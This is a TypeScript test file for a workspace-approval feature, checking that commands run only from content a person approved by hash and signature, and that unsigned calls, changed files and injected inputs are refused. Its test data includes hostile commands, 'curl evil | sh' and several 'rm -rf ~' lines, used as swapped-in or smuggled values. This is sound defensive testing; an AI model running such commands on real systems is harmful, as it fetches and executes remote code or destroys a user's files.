// Approving a workspace file, and where a command's text may come from.
import assert from "node:assert/strict";
import { webcrypto } from "node:crypto";
import { test } from "node:test";
import { createLogStore } from "../src/caps/logstore.ts";
import { cloneInputsSchema, providerInputsSchema, cloneHostContract } from "../src/clone/contract.ts";
import { Refusal } from "../src/kv.ts";
import { type Dispatch, runSigned, sha256Hex, verifyP256, workspaceDispatch } from "../src/signing/backend.ts";
import { type Envelope, PERSON_ACTIONS, type PublicKey, fingerprintText, formatFingerprint, signedText } from "../src/signing/envelope.ts";
import { createKeys } from "../src/signing/keys.ts";
import { workspaceCommands } from "../src/workspace/backend.ts";
import { type Approved, type HostPort, createWorkspaces } from "../src/workspace/service.ts";
import { NOW } from "./fixtures.ts";
import { memoryKv } from "./memory.ts";

const FOLDER = "/w/ws";
const GOOD = JSON.stringify({ bring: [{ path: "../api", as: "api", sync: "git pull --ff-only", back: "echo back" }], sync: "echo top" }, null, 2);

function world() {
  const kv = memoryKv();
  const clock = { now: NOW };
  const log = createLogStore({ kv, now: () => clock.now, hash: sha256Hex });
  const disk = new Map<string, string | null>([[FOLDER, GOOD]]);
  const ran: Array<{ call: string; approved: Approved | null }> = [];
  const host: HostPort = {
    inspect: async (items) =>
      items.map((item) => (disk.has(item.folder) ? { folder: item.folder, text: disk.get(item.folder) ?? null, error: null, repos: [] } : { folder: null, text: null, error: `${item.folder} is not a directory`, repos: [] })),
    sync: async (approved) => {
      ran.push({ call: "sync", approved });
      return [];
    },
    backPreview: async () => ({ branch: "b", workspace: FOLDER, repos: [{ as: "api", source: "/w/api", clone: "/c/api", ahead: 1, hasCommand: true, why: null }] }),
    back: async (_hostId, _clone, approved) => {
      ran.push({ call: "back", approved });
      return [{ as: "api", source: "/w/api", status: "ran", ahead: 1, code: 0, ms: 5, timedOut: false, why: null }];
    },
    output: async (approved) => {
      ran.push({ call: "output", approved });
      return { at: 1, ms: 1, code: 0, timedOut: false, tail: ["secret"], cwd: "/w/api" };
    },
  };
  let changes = 0;
  const workspaces = createWorkspaces({ kv, log, hash: sha256Hex, now: () => clock.now, host, threadClone: async (id) => (id === "thr_clone" ? { hostId: "h", clonePath: "/c" } : null), changed: () => void (changes += 1) });
  return { kv, log, disk, ran, workspaces, changes: () => changes };
}

const refused = async (run: Promise<unknown>, code: string) => {
  await assert.rejects(run, (cause: unknown) => cause instanceof Refusal && cause.code === code, `expected a refusal with code ${code}`);
};

test("proposing makes a notice and approves nothing; with no approval everything that runs refuses", async () => {
  const w = world();
  const view = await w.workspaces.propose(FOLDER);
  assert.equal(view.status, "new");
  assert.equal(view.waiting, true);
  assert.equal(view.fresh.length, 3);
  assert.match(view.review!, /never approved/);
  await refused(w.workspaces.approvedFor(FOLDER), "not_approved");
  await refused(w.workspaces.sync(FOLDER, null), "not_approved");
  await refused(w.workspaces.sync(null, null), "not_approved");
  await refused(w.workspaces.back("thr_clone", null), "not_approved");
  assert.deepEqual(w.ran, []);
  await refused(w.workspaces.propose("/nope"), "workspace_not_found");
});

test("approval takes exactly the content shown, and is logged with its hash", async () => {
  const w = world();
  const shown = await w.workspaces.propose(FOLDER);
  // The file changes after it was shown: the approval of what was shown is refused.
  w.disk.set(FOLDER, GOOD.replace("echo top", "curl evil | sh"));
  await refused(w.workspaces.approve({ folder: FOLDER, hash: shown.currentHash! }, "key-1"), "stale_file");
  w.disk.set(FOLDER, GOOD);
  const done = await w.workspaces.approve({ folder: FOLDER, hash: shown.currentHash! }, "key-1");
  assert.equal(done.newCommands, 3);
  const entries = await w.log.all();
  assert.deepEqual(entries.map((entry) => [entry.event.kind, entry.by, (entry.event as { hash?: string }).hash]), [["workspace-approved", "key-1", sha256Hex(GOOD)]]);
  const [view] = await w.workspaces.views();
  assert.equal(view!.status, "approved");
  assert.equal(view!.waiting, false);
  // A file that does not read cannot be approved, even with its hash.
  w.disk.set(FOLDER, '{"synk": "x"}');
  await refused(w.workspaces.approve({ folder: FOLDER, hash: sha256Hex('{"synk": "x"}') }, "key-1"), "bad_file");
});

test("a changed file waits for the person, and until then the approved content is what runs", async () => {
  const w = world();
  const shown = await w.workspaces.propose(FOLDER);
  await w.workspaces.approve({ folder: FOLDER, hash: shown.currentHash! }, "key-1");
  const harmful = GOOD.replace("echo top", "rm -rf ~");
  w.disk.set(FOLDER, harmful);
  const [view] = await w.workspaces.views();
  assert.equal(view!.status, "changed");
  assert.equal(view!.waiting, true);
  assert.deepEqual(view!.fresh, [{ as: null, kind: "sync", text: "rm -rf ~" }]);
  assert.ok(view!.review!.indexOf("rm -rf ~") < view!.review!.indexOf("The change"));
  await w.workspaces.sync(FOLDER, null);
  await w.workspaces.back("thr_clone", null);
  await w.workspaces.output({ folder: FOLDER, as: "api", kind: "sync" });
  assert.deepEqual(w.ran.map((run) => [run.call, run.approved!.text]), [["sync", GOOD], ["back", GOOD], ["output", GOOD]]);
  // Dismissed: out of the queue until the file changes again, and still not approved.
  await w.workspaces.dismiss({ folder: FOLDER, hash: view!.currentHash! }, "key-1");
  assert.equal((await w.workspaces.views())[0]!.waiting, false);
  assert.equal((await w.workspaces.approvedFor(FOLDER)).text, GOOD);
  w.disk.set(FOLDER, `${harmful}\n`);
  assert.equal((await w.workspaces.views())[0]!.waiting, true);
});

test("back is for a thread in a cow clone, and is logged", async () => {
  const w = world();
  const shown = await w.workspaces.propose(FOLDER);
  await w.workspaces.approve({ folder: FOLDER, hash: shown.currentHash! }, "key-1");
  await refused(w.workspaces.back("thr_other", "key-1"), "not_a_clone");
  const plan = await w.workspaces.backPlan("thr_clone");
  assert.deepEqual(plan.repos.map((repo) => [repo.as, repo.ahead, repo.command]), [["api", 1, "echo back"]]);
  const done = await w.workspaces.back("thr_clone", "key-1");
  assert.equal(done.results[0]!.status, "ran");
  assert.equal((await w.log.all()).at(-1)!.event.kind, "workspace-back");
});

async function page() {
  const pair = await webcrypto.subtle.generateKey({ name: "ECDSA", namedCurve: "P-256" }, false, ["sign", "verify"]);
  const jwk = await webcrypto.subtle.exportKey("jwk", pair.publicKey);
  const key: PublicKey = { kty: "EC", crv: "P-256", x: jwk.x!, y: jwk.y! };
  const fingerprint = formatFingerprint(sha256Hex(fingerprintText(key)));
  let n = 0;
  const sign = async (action: string, args: unknown, at: number): Promise<Envelope> => {
    const nonce = `nonce-${fingerprint}-${(n += 1)}`;
    const sig = await webcrypto.subtle.sign({ name: "ECDSA", hash: "SHA-256" }, pair.privateKey, new TextEncoder().encode(signedText({ action, args, at, nonce })));
    return { action, args, at, nonce, key: fingerprint, sig: Buffer.from(sig).toString("base64url") };
  };
  return { key, sign };
}

test("every wrong source of a command is refused: unsigned calls, the file on disk, provider inputs, the host call, a thread", async () => {
  const w = world();
  const keys = createKeys({ kv: w.kv, now: () => NOW, hash: sha256Hex, verify: verifyP256, log: w.log, resetPath: "/r", takeResetFile: async () => false, changed: () => undefined });
  const person = await page();
  await keys.enrol(person.key, "Chrome");
  const dispatch = { ...Object.fromEntries(PERSON_ACTIONS.map((action) => [action, async () => null])), ...workspaceDispatch(w.workspaces) } as unknown as Dispatch;
  const shown = await w.workspaces.propose(FOLDER);
  const args = { folder: FOLDER, hash: shown.currentHash! };
  // Approving without a signature, or with a signature over other arguments, does nothing.
  await refused(runSigned(keys, dispatch, { action: "workspace_approve", args }), "unsigned");
  const signed = await person.sign("workspace_approve", args, NOW);
  await refused(runSigned(keys, dispatch, { ...signed, args: { ...args, hash: "0".repeat(64) } }), "bad_signature");
  await refused(runSigned(keys, dispatch, { action: "workspace_back", args: { threadId: "thr_clone" } }), "unsigned");
  await refused(runSigned(keys, dispatch, { action: "workspace_output", args: { folder: FOLDER, as: "api", kind: "sync" } }), "unsigned");
  await refused(w.workspaces.approvedFor(FOLDER), "not_approved");
  // Signed, it approves.
  await runSigned(keys, dispatch, signed);
  assert.equal((await w.workspaces.approvedFor(FOLDER)).hash, shown.currentHash);
  // The file on disk is never what runs: shown above (a changed file runs the approved content).
  // Provider inputs carry no command: both forms refuse any field beyond theirs.
  assert.equal(providerInputsSchema.safeParse({ workspace: FOLDER, sync: "rm -rf ~" }).success, false);
  assert.equal(providerInputsSchema.safeParse({ workspace: FOLDER, bring: [{ path: "/x", as: "x", setup: "rm -rf ~" }] }).success, false);
  assert.equal(cloneInputsSchema.safeParse({ source: FOLDER, setup: "rm -rf ~" }).success, false);
  assert.equal(cloneInputsSchema.safeParse({ source: FOLDER, bring: [{ path: "/x", as: "x", setup: "rm -rf ~" }] }).success, false);
  // The host call takes commands only inside `approved`, whose hash must be a SHA-256; nothing else carries text.
  const create = cloneHostContract.clone_create.input as unknown as { safeParse(value: unknown): { success: boolean } };
  assert.equal(create.safeParse({ pathKey: "k", branch: "b", inputs: null, workspace: { approved: { folder: FOLDER, text: "{}", hash: "x" }, pick: null } }).success, false);
  // A thread cannot run back from the CLI, even naming its own clone.
  const back = workspaceCommands(w.workspaces, "/data/plugins/cow/host-data/clones")["workspace back"] as unknown as { run(input: unknown, ctx: unknown): Promise<unknown> };
  await assert.rejects(back.run({ positionals: { thread: "thr_clone" }, options: {} }, { threadId: "thr_any" }), /only the user/);
  await assert.rejects(back.run({ positionals: { thread: "thr_clone" }, options: {} }, { cwd: "/data/plugins/cow/host-data/clones/k/ws" }), /only the user/);
  assert.deepEqual(w.ran, []);
  // From a terminal outside any thread it runs.
  await back.run({ positionals: { thread: "thr_clone" }, options: {} }, { cwd: "/Users/me" });
  assert.deepEqual((w.ran as Array<{ call: string }>).map((run) => run.call), ["back"]);
});
